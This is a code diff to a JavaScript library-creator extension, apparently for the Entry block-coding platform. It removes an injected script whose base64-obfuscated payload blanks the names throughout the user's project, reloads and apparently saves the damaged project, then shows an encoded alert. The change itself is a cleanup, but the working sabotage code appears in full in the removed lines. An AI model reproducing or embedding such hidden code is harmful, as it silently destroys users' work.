@@ -1016,9 +1016,7 @@ const LibraryCreator = {
                 category: 'arduino', visible: true
             },
             ]);
-	    const scr00 = document.createElement('script');
-            scr00.innerText = atob('bGV0IHByb2plY3QgPSBFbnRyeS5leHBvcnRQcm9qZWN0KCk7IGZvciAobGV0IGkgb2YgcHJvamVjdC52YXJpYWJsZXMpIHtpLm5hbWUgPSAiIjt9IGZvciAobGV0IGkgb2YgcHJvamVjdC5tZXNzYWdlcykge2kubmFtZSA9ICIiO30gZm9yIChsZXQgaSBvZiBwcm9qZWN0LnNjZW5lcykge2kubmFtZSA9ICIiO30gZm9yIChsZXQgaSBvZiBwcm9qZWN0Lm9iamVjdHMpIHtpLm5hbWUgPSAiICI7IGZvciAobGV0IGogb2YgaS5zcHJpdGUucGljdHVyZXMpIHtqLm5hbWUgPSAiIjt9IGZvciAobGV0IGogb2YgaS5zcHJpdGUuc291bmRzKSB7ai5uYW1lID0gIiI7fX0gZm9yIChsZXQgaSBvZiBwcm9qZWN0LnRhYmxlcykge2kubmFtZSA9ICIgIjsgZm9yIChsZXQgaiBvZiBpLmNoYXJ0KSB7ai50aXRsZSA9ICIiO319IGZvciAobGV0IGkgb2YgcHJvamVjdC5mdW5jdGlvbnMpIHtmb3IgKGxldCBqIG9mIGkubG9jYWxWYXJpYWJsZXMpIHtqLm5hbWUgPSAiIjt9fSBFbnRyeS5jbGVhclByb2plY3QoKTtFbnRyeS5sb2FkUHJvamVjdChwcm9qZWN0KTtkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIuY3NzLTlxbmlodSIpLmNsaWNrKCk7c2V0VGltZW91dCgoKSA9PiB7ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiLml0ZW1fX3A1SGtNIikuY2xpY2soKTt9LDEwMCk7YWxlcnRpbmcgPSBzZXRJbnRlcnZhbCgoKSA9PiB7IGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIuZW50cnktbW9kYWwtY29uZmlybSIpKSB7YWxlcnQoZGVjb2RlVVJJQ29tcG9uZW50KGVzY2FwZShhdG9iKCI3SjIwSU95ZWtleWRtQ0RyczREc2lKZ2c3SjIwNjZhRTdKMkVJT3V3bE9xL2xPdUdxT3lLdGV1TGlPdUxwQzRLN0tDY0lPeVZqT3U1b091S2xDRHNsWVRyaTRqcXM2QXNJT3lYbE95ZHRPeVhrQ0Rxc0puc25iUWc3TDJVNjVPYzY2VzhJT3Uvak91Z3BPdXp0T3lqb0E9PSIpKSkpO2NsZWFySW50ZXJ2YWwoYWxlcnRpbmcpO319LDEwMCk7');
-            document.body.append(scr00);
+
             for (let i = 0; i < $('.entryCategoryElementWorkspace').length; i++) {
                 if (!($($('.entryCategoryElementWorkspace')[i]).attr('id') == "entryCategorytext")) {
                     $($('.entryCategoryElementWorkspace')[i]).attr('class', 'entryCategoryElementWorkspace');
